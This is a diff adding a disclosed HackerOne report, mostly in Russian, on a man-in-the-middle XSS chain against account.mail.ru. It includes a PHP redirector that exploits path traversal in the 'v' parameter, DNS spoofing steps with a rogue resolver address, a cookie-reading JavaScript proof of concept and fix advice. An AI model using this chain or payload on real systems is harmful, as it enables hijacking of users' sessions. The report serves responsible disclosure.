@@ -1,0 +1,144 @@
+ReportLink:https://hackerone.com/reports/291522
+WeaknessName:Man-in-the-Middle
+Reporter:https://hackerone.com/obmi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:26.01.2018 14:11:48
+
+Summary:
+Due to combination of
+1. Wildcard certificate usage
+2. Unvalidated Host: name in HTTP(s) request
+3. Reusing domain name for hosting of user-controlled files
+4. Unfiltered parameter reflection
+
+It was possible for attacker who can perform active MitM access between client and server to execute javascript in the context of  https://account.mail.ru/login page.
+
+1. Уязвимость на станице https://account.mail.ru/login и подготовка файлов для атаки
+---------------------
+
+В процессе исследования заметил, что на странице https://account.mail.ru/login не валидируется значение параметра v. Значение выводится на странице как есть и используется в пути до скрипта (т.е. атакующий может его изменить). 
+
+Пример:
+
+{F240637}
+
+2. Подмена хостов и загрузка ресурсов с другого домена.
+---------------------
+
+Я предположил, что атака возможна, если заставить клиента скачивать скрипт с домена files.imgsmail.ru, меняя пусть к нему через уязвимость параметра v (описано выше)
+На домене files.imgsmail.ru хостятся юзерские файлы, которые отправляются через агент. Единственное условие доступа к ним - совпадение юзерагента, поэтому нужен редиректор, приведенный ниже.
+
+У атакующего нет возможности подменить домен с которого будет идти загрузка скрипта или контролировать содержимое файлов на img.imgsmail.ru. Если только он не контролирует dns сервер, которым пользуется жертва или вообще точку доступа (такое возможно, например в публичных сетях в кафе или торговом центре). Если dns сервер будет возвращать A запись о том, что img.imgsmail.ru соответствует адресу 178.237.20.77 (настоящий IP адрес для домена files.imgsmail.ru, откуда отдаются файлы, загруженные в agent), то браузер будет пытаться грузить ресурсы оттуда (а вот на files.imgsmail.ru атакер уже может заливать свой контент). 
+Для теста я поднял и настроил dnsmasq по адресу 52.34.103.214 и вбил настройки в домашний роутер:
+
+```
+mihailob@kali:~dig  '@52.34.103.214' +short img.imgsmail.ru
+94.100.180.102
+```
+
+```
+mihailob@kali:~$ host img.imgsmail.ru
+<img.imgsmail.ru has address 94.100.180.102
+```
+
+Небольшое препятствие заключается в том, что сервер files.imgsmail.ru при доступе к файлам агента по прямой ссылке идентифицирует клиента по user-agent строчке. Поэтому атакующему необходимо загрузить файлы с необходимымы юзерагентами и составить табличку для нужных редиректов.
+Я сделал такой простенький скрипт у себя на сервере:
+
+```
+<?php
+$client_ua = $_SERVER['HTTP_USER_AGENT'];
+
+//var_dump($client_ua);
+$redirect_url = 'https://account.mail.ru/login?v=0.3.13/../../../get/';
+$ua_routes = [
+        //FF Linux
+    'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' => 'xgLens3gSCg20hivTRagWNJRagV09F1hUtAC3K9CioIhdEw7VhTMdkGKwqR9chXUcSWxg0hVDsrc1XBxfAMPWsZ7Mtigx6UIAKNvO1wguGm9lswX92YxmurFLxsehkKgsbKUWhd6Ds0gMFnvrx4bgpghRlTRag/test.js??',
+    //Win NT 6.1
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0' => 'ourROgRyY0ku4SBxmNtiAftNtiueG2xIF0E4niIFY8QIhIbSNsOVm37svkC3JIphAJEIaiT0sGnh6tRSGm4R0SdBEljIzlaJs1qhqp5Gqf7XO1rnnHZGOMD5WSuuwJgikJd8dGSM67pSOzv2ks0kPTQScKmNti/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0' => 'om2NJuByvqNogCHXvaUt3GvaUt8jzMdXpH9uotxgNnECLY1b2iY42SrCo5cJpmzPshamovxhUXZqzTztSdzOGCiG1kgCwriFECVb3g2tKaoeUiDpXzLmezd2mCMd7OhXQj0qDXddq6iChpGYRtkicPECWXvaUt/test.js??',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0' => 'wFzJqfD5AQJjR1iyVvMGOQ4vMGqrIUxiC1gHvSqrfHAGWB6a0GMrG2HGPEJyC1Cypecsy2RraIqVyJy1RMCogGVAlL61qhB7mSrlrrys701JPsfU91gSA4ckgi563H71Rvl5EG4zFFX1GQjhHSIwZF2IW2VvMG/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0' => 'ZbDbdu16AYF2010DXyISt0XyIS8SL2IIu0tr5SJ7UdaGi36yIGVG9KsIzpfxfSgpKTQIxpPCK1nqHVrSDiKB6sX7udJGtvrvCGzHFiGiMXQy01KUVdqGAeVAI1zQ04miHe9zmGQGCYT1ejo80I9jr8tGwjXyIS/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0' => 'vpRuf62pV0FyCGmoE7Xi77a7XiCmcARSNSutsG4eO2nIxKm7fIOrW84InQz1tSLKAuWSdBHP6s876juGylvbbGbAl5f1GNYak1Mjgt7SM1p5aSMANl6SU1XSsIt8DaMIdOFiqIyxIRHSd7XIWSaTodKGoaE7Xi/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' => 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0' => 'OQLdZufaBxzcnxFr2znRM2znxHWlfdxeS07oKsAlw7KZOCFuKfqpmPhpcdleKAD4SusbGUK9KnmZsBgADpt9g40VtXsISqZXKkALtGsaisTMhGVd8HxJeXbph7ggAphyBpY9h3sXk4hUcXEbxQ5pXOxE82znx/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0' => 'mKXu3WpU65pDSClK0xEX6LQxEXBgQwImV93momlfXCwikA6ZWmTyuy6CTuLopXBuoDaiWqJ8cXEiIMNifkxqAC5v26vmQs6cBC8RFHJCsFfxXtTIGw0ihPyLImUAkW7XENNugtsCcbgmJLrvJmzCSreiIh0xEX/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0' => 'jUhPoHrrhcc2lXqPoiJCIzoiJCvMWqQCwDCu2X25qzimWNoj0tg3BU5XWQYMDtL3TX3CLlUdaiCPvxltOGtyXtLmqGRta445TC4syJaCa8oENmjNRwdtB1ugEiRLlBOtBafDytPomFNtjbSIUig1vxoi27oiJC/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0' => 'Pz4beFySYDyPP1RYUXbSHDcXbSWgeaNG853xb1IRUGpSV9Lj31ZGjtjGnqV3KG8gGvxIsFfOkGlEfjSIuAqBWSvebheGriFXGiyTHJgGdrBJpIeI6JvS0czWoS6lW3P1JQjOxIcawsaG1Wv8KigoWd5GCDUXbS/test.js?',
+    //
+    'Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0' => 'a4rrNIMBcXes0sJCPoQgHRToQg53mk5gR3hkLhII1c4gMIQWjxxttkHKTylx3sOn98yKI2nGgK9e2DZxurDPgxGZFcchE5vNtxCIgeosiTjRfsMlSFah9af5HKsbmfvg6CBrnx45lCVsZuPDvKShMVaxtnPoQg/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0' => 'SM7AU6KcSv4OoIbTfXlIoJ9XlIIFzvmS4zlFUGxBtfdGyqJDbIvImUjS9oCLJsCyajIGvj0gAGCecXtIV617TIrhBpa1UmvUVG9O8or1vevoIiU4xnZSco5Ss1eSsxsI4ARuPICyDYjILLqGnSUIo1iifJfXlI/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0' => 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0' => 'qBcio58DE2Ty5ZKzZduZPKAduZTU8YbWqwjPjnb84lQRVWcybAhUu7pnhH5XaZndQHLnGGRrqAcQInZA8QwH4WNytuqAQ9QB4nq5XijRAVzAiZ0WqU5RagJNOnXuIbaAaZ8zbRVVltpRjcI4wWWIarknezZduZ/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0' => 'klBBESp2lWvq4KkR8e2gBs0e2gRSxqRsuzYzFKTXCeBx2izlqx1DmuxxlWqmssq1FT6hqc55IKREonIgs6EZHg1CriJKT8ApLx0X1bUgZaSVaKixf9RKG0aA8giwofJxoeC0XhVhtWBgDtqQtsh42PJKr38e2g/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0' => 'dpDeMJHxyWyFOKxLulIsvxPlIsilnLIg0fpjyxnHR2nhwa7uih9dRLZg3gmgXgFvNpcx2TJqyKTRn8ehTWKmAhADBKsKD99cssN1dCSsJY0KMhlGNX0hRRKkpsMLGCIsAg7ZFhpLa3RgflEFahAqIWAsaBulIs/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0' => 'RbDCzTqxyZWfIKxLJ8us8B58usUJ4v9xsdGiAxQv6DbgjO3kAh1YCWPKEO8n2xGGogsxVPKvJhWUz91x81qLExT2mT6hDLPEgKcYz8KhKwWsGhl06zIh5Gs3rs5vPzZxLdBPoKE0Heag7An8AsYQOsLKv2J8us/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:55.0) Gecko/20100101 Firefox/55.0' => 'kEOixDxyes0DHxLBBlAKx3LlAKNrNcrKeyJDdxJN7Xrg6snWsKqiMI3KgJz6Bxau1LjsnbaaHxO2pQjgfuNhjx4MrVXsowA7whUhLIwKGMWkjxnz6YIKns97Wh12BnMxbgVaphPxiMdsZ6t97KVpaGzgQkBlAK/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:56.0) Gecko/20100101 Firefox/56.0' => 'OlNqOVzneOQjNXur6pDCWiUpDCnE4uYX7qIOPioH923ChlQzwiXkfmpmhKTOrmTesUwCf9i8yXLREVRmciRc0iKsQBktwmTfgmTXkJWmCtUXqmYOwlsXC09GjCC0AoLX0zupzir3ns0tZP7VNC8xDLsXW86pDC/test.js?',
+    'Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0' => 'mHkTlJNUd65apnQxf1PWM7Y1PWnRAFyWxpPSwZFcg3GRN9EMDWBdAhaZZQrEQnSaBuCRqEBBARNHzNyZHKQKGA1Guo0n9ZMYGWWW6a2ZmgQdRRm7va9nVkmEsABj2FaZoXv3rZoOHLqAAVX1JWlJcD9Wqy91PW/test.js?',
+    //Win NT.10
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0' => 'YuXAP8AuGn7HFgyjjItsHsbItsgrGpSg9q42KxpdeNXKShwfoxhgUyCgMlEeHghTqrhx15zvixqb2j9K8lalnsknzbWsdIXqpxE3lsQs1zVRzxS0uTzx0hjZSxxhZa0KOloWss4UQsMhO6d7HhlFPPBKcDjIts/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0' => 'YxXfyOWmUU2w2nvkZHQWIenHQWyzdtbn1rqp0AIn13aZ0gKJWWNVWI6AKqG6RZzccBanM2IMEn3EgRcZuIBV6AB7X5dAuzHveZMhj1YZrWxQtRZh78jZhn5L1niXX8uAAklusn7Av4gAM1aQIZu73OwZZHZHQW/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0' => 'bYBZTCrdm8jZ9mlxvzjiyLlzjiALh3hX2QSGxmLcoJ3XrqhhTC7Kd4NXd6aMDCW78HzC77kCFtr5KCVXRRnRMtbkcPCtaiV8XXi6MnHC53VPEik7clECewpF3C2XHXWtvXT3EtPK90RtzN4FUi8YbAfm3ybzji/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0' => 'QOBjrepKtgoa5gg0kH6rokH6xyIuiugzk7T6Kokm1vsp3hCJh3Mvs5hO41oTg6PtjDgKEeTNhFzbO8Kf4fLmgzJ4c3Ktulb3s8hZR6KMrYCoxvs9mxx4VgA2gOjFZihVO8kNxCdyMgK90tRKhvVKl9sE4kH6x/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0' => 'crUcnsXPdDZgbIGEwrlSzqPrlSXmTtCGM6OTTsft9AD1KUKNCGqlScKGGvjTUsPliaJ18qQx6sPTJA21I3qEbIrulcUGiFNbBsILbB0G3aRhnGOjSze1QZFsU1OnUqSIuua8oGXMh4RIrYbkDSG34V1inawrlS/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0' => 'wCdB7I5zX5NNCtpyW5bXXZZ5bXVCSqltWhOS3XQ4iFItagpystwjZmFCJs40JCmGXJitGT02YXoMJF9tlYxz9Crk5RaCq9ZHECvcauHiaUymNC4fINLi9LiASXJWFGZXua6IstlkEwNtt39pTt70YVUmd2W5bX/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0' => 'oTBkcbOHuUcYsWqqDsdWCPYsdW5PhHPAYOV3QZz5k1jZJjnwLAezYKpR8NEiAnYaegunHlqqbnUWgVUnZVt4NWKDFVQWfPwwUn5Dc9kZ6YaiQnSbR8rZSI6kgnkFg35nSMDzFWOAjZ7nb9zyYRFAwy3AlEDsdW/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0' => 'fy9ixvQKJIH4lKg9BZGhb7kZGhrSpIBhljfuPx0zOJoKQZZZDhFHBZ3sRY3hkxGvrBdxR8lsvsSP7JNhwWDL3g5fnSSsJjwtdhyrtArxwuUOmKpFN0WgUPsywgmhUIqh2k1qeh5BU1dgexFXnxTnr0HxERBZGh/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0' => 'aaSPTTusNXXrUgXx088gFF888guu4vBhi4RD8sz3ojNgDG4zQhf2bNpglMlBChpaXbuKb6issggYXSBKWfNo8KTXFckhpTqLtgnjQT4stW5fwKR3IC6g0ruobhSQwEhg19z8es3NN2uxp1VUhxrtmoBhryQ88g/test.js?',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0' => 'Oya1mq9p9w2HatCXHuqmqw6uqm7MrGmXyUAngtAHciQX6St13mapMvRtOY8glidLOJbCN4Aw4CEVvy3m3ZEKwiDTE39tnwoZbiy9UzLXQVDLliJPoq8tciHsVXw9nYNt8ndmyX96lUJmlao4gtgk7ymCUXHuqm/test.js?',
+    //
+];
+
+if (!empty( $ua_routes[$client_ua] ) ) {
+        $destination = $redirect_url . $ua_routes[$client_ua];
+        header('Location: ' . $destination);
+}
+else {
+        header("Content-Type: text/plain");
+        echo 'Unknown user-agent:<'.$client_ua.'>';
+}
+```
+
+Я заранее понаотправлял файлы через агент своему контакту с вышеприведенными юзерагентами. Содержимое загруженного файла было одинаково во всех случаях:
+
+```
+mihailob@kali:~/tmp cat test.js 
+alert('Hello i am attacker script from uploaded file via agent. The script was executed on a domain:' + document.domain + '. The cookie are: ' + document.cookie );
+```
+
+{F240638}
+
+3. Сценарий атаки
+---------------------
+
+1. атакер конфигурирует сеть таким образом, что в качестве dns'а используется подконтрольный ему сервер. По запросу img.imgsmail.ru он будет давать ip 178.237.20.77 (адрес files.imgsmail.ru):
+2. жертва подключается к такой сети
+3. жертва открывает страницу по ссылке откуда-нибудь (ну или атакер подмешивает ей автоматическое открытие в http трафик, как делают показ рекламы в московском метро или в мобильном интернете) и запускает код атакующего
+
+4. POC:
+---------------------
+
+Стабильно воспроизводится в последнем Firefox, но не работает в Google chrome (в данном примере не работает потому что хрому нужен явный content-type для js). Думаю, что Firefox'а достаточно для пруфа.
+
+1. Выставить в настройках сети dns сервер: 52.34.103.214. 
+2. Открыть ссылку-редиректор: https://obmhld.com/pocs/?token=b0c93dc547233c441e2316d87ff067c2
+
+Если вашего юзерагента не оказалось в моем списке - вы можете сами выставить на клиенте нужный юзерагент, который уже есть в редиректоре, чтобы убедиться в работоспособности сценария. Список приведен выше в исходниках редиректора.
+Если по каким-то причинам вы не можете использовать существующий - напишите мне, пожалуйста, - я добавлю ваш user-agent в список.
+
+Записал видео, как это выглядит у жертвы (браузер под виртуалкой - firefox 57 под win7, без дополнений и расширений, никаких манипуляций с сертификатами не проводил )
+
+{F240639}
+
+5. Как починить:
+---------------------
+
+Как быстрофикс - можно провалидировать хосты на машинах в конфиге nginx'а, чтобы не было возможности обращаться к серверу 178.237.20.77 с заголовком Host: img.imgsmail.ru.
+Также нужно добавить более жесткую валидацию параметра v на странице https://account.mail.ru/login?
+
+P.S. Я уверен что в реальности сценарий может быть еще проще, если атакующий контролирует всю сеть. Он может, к примеру, заменить ответ на любой http запрос с целью редиректа пользователя с нужным параметром автоматически, такое можно наблюдать в московской подземке, где подмешивается реклама в контент http страниц или у мобильных операторов, мтс (по крайней мере в Москве) подсовывает свою рекламу в http ответы.
+
+P.S.p.s. Если что-то описал не совсем понятно - дайте мне знать, буду рад помочь.
